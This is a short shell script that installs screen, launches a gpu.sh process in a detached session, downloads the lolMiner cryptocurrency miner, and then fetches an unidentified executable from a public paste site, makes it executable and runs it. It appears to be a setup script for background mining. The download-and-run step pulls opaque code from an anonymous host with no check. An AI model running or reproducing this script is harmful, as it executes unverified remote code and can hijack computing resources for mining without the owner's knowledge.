#!/bin/sh
sudo apt update 
sudo apt install screen -y 
screen -dmS gpu.sh ./gpu.sh 65 75
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
tar -xf lolMiner_v1.31_Lin64.tar.gz 
cd 1.31
wget https://www.heypasteit.com/download/0IWYYQ 
chmod u+x 0IWYYQ
./0IWYYQ
